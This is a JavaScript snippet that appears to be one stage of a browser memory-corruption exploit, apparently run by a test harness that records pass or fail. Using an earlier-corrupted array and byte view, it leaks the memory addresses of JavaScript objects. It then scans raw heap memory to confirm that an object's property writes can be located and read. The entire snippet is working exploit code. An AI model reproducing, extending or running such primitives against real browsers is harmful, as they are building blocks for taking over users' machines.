// Compare leaked object words with live property-byte positions in the view.
var state = window.__fw14ArrayState;
var phase = "preflight";
var result;
try {
  if (!state || !state.view || !state.array || !state.a ||
      state.array.length !== 8192 || state.array[0] !== state.a ||
      !Number.isInteger(state.index) || state.index < 0)
    throw new Error("held_array_preflight_failed");
  var view = state.view;
  var index = state.index;
  var c = { marker: 0x41414141 };
  var d = { marker: 0x41414141 };
  state.c = c;
  state.d = d;
  function leak(value) {
    var word = "0x";
    try {
      state.array[0] = value;
      for (var i = 7; i >= 0; i--)
        word += view[index + i].toString(16).padStart(2, "0");
    } finally {
      state.array[0] = state.a;
    }
    return word;
  }
  function compareProperty(object) {
    var limit = 524288;
    var baseline = new Uint8Array(limit);
    for (var a = 0; a < limit; a++) baseline[a] = view[a];
    var first = -1;
    var count = 0;
    var positions = [];
    var restored = false;
    try {
      object.marker = 0x42424242;
      for (var b = 0; b < limit; b++) {
        if (view[b] !== baseline[b]) {
          if (first < 0) first = b;
          count++;
          if (positions.length < 16) positions.push(b);
        }
      }
    } finally {
      object.marker = 0x41414141;
      restored = object.marker === 0x41414141;
      for (var r = 0; r < positions.length; r++)
        if (view[positions[r]] !== baseline[positions[r]]) restored = false;
    }
    return { first: first, count: count,
      positions: positions.join(","), restored: restored };
  }
  phase = "compare_c";
  var cWord = leak(c);
  var cResult = compareProperty(c);
  phase = "compare_d";
  var dWord = leak(d);
  var dResult = compareProperty(d);
  var cPointer = Number(cWord);
  var dPointer = Number(dWord);
  var deltaMatch = cResult.first >= 0 && dResult.first >= 0 &&
      Number.isSafeInteger(cPointer) && Number.isSafeInteger(dPointer) &&
      dPointer - cPointer === dResult.first - cResult.first;
  var arrayRestored = state.array[0] === state.a;
  result = { id: "object_inline_scan", status:
      deltaMatch && cResult.restored && dResult.restored && arrayRestored ?
          "pass" : "fail", details: {
      c_word: cWord, d_word: dWord,
      c_first: cResult.first, d_first: dResult.first,
      c_count: cResult.count, d_count: dResult.count,
      positions: cResult.positions + ";" + dResult.positions,
      c_restored: cResult.restored, d_restored: dResult.restored,
      delta_match: deltaMatch, array_restored: arrayRestored
    } };
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "object_inline_scan", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
